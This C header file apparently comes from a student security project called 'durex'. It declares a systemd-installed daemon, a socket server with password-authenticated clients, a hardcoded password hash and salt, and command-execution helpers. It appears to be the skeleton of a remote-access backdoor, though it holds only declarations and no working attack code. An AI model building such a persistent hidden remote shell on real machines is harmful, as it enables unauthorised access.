/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   durex.h                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: user42 <user42@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2022/02/08 14:19:30 by user42            #+#    #+#             */
/*   Updated: 2022/02/11 15:24:32 by user42           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef DUREX_H
# define DUREX_H

#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <crypt.h>

# define	DUREX_BIN		0
# define	DUREX_DAEMON	1

# define	CMD_OUT_MAX		2048

# define	RECV_SIZE		4096

# define	HASHED_PASSWD	"42WDwZekFhiD."
# define	SALT			"42"

typedef struct				s_durex_bin
{
	char					*systemd_folder;
	char					*config_path;
}							t_durex_bin;


typedef struct				s_client
{
	int						fd;
	int						id;
	int						auth;
	struct sockaddr_in		sockaddr;
	struct s_client			*next;
}							t_client;

typedef struct				s_server
{
	int						listen_sd;
	int						max_sd;
	int						last_id;
	int						client_nb;

	fd_set					master_set;
	fd_set					read_set;
	fd_set					write_set;

	char					buff[RECV_SIZE];

	t_client				*clients;
}							t_server;



/* ===== Durex binary functions ===== */
void				durex_bin(void);

/* ===== Durex daemon functions ===== */
void				durex_daemon(void);

/* ===== Command execution utilities ===== */
void				clear_env(void);
int					exec_safe(char *cmd, char **args);
int					exec_safe_w_output(char *cmd, char **const args, char *cmd_outbuf);




# endif
